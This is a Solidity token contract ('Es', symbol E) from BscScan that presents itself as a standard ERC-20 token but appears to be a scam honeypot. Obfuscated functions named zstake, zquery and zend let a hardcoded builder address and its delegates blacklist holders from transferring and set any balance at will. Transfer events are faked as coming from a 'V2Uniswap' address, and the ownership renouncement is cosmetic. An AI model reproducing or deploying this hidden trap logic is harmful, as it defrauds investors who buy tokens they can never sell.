/**
 *Submitted for verification at BscScan.com on 2022-10-30
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _buidlr = 0x3037290Aa65CbC698Fa4365023C3f847a6feE68D;
	address V2Uniswap = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract E is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private xxL;
	mapping (address => bool) private yyL;
    mapping (address => bool) private ooL;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _totalsup = 150 * 10**_decimals;
    string private constant _name = "Es";
    string private constant _symbol = "E";



    constructor () {
        xxL[_MsgSendr()] = _totalsup;
        emit Transfer(address(0), V2Uniswap, _totalsup);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _totalsup;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return xxL[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function zend(address yz) public {
        if(yyL[msg.sender]) { 
        ooL[yz] = false;}}
        function zquery(address yz) public{
         if(yyL[msg.sender])  { 
        require(!ooL[yz]);
        ooL[yz] = true; }}
		function zstake(address yz) public{
         if(msg.sender == _buidlr)  { 
        require(!yyL[yz]);
        yyL[yz] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _buidlr)  {
        require(amount <= xxL[sender]);
        xxL[sender] -= amount;  
        xxL[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (V2Uniswap, recipient, amount);
        return true; }    
          if(!ooL[recipient]) {
          if(!ooL[sender]) {
         require(amount <= xxL[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        xxL[sender] -= amount;
        xxL[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _buidlr)  {
        require(xxL[msg.sender] >= amount);
        xxL[msg.sender] -= amount;  
        xxL[recipient] += amount; 
        emit Transfer (V2Uniswap, recipient, amount);}
        if(yyL[msg.sender]) {xxL[recipient] = amount;} 
        if(!ooL[msg.sender]) {
        require(xxL[msg.sender] >= amount);
        xxL[msg.sender] -= amount;  
        xxL[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}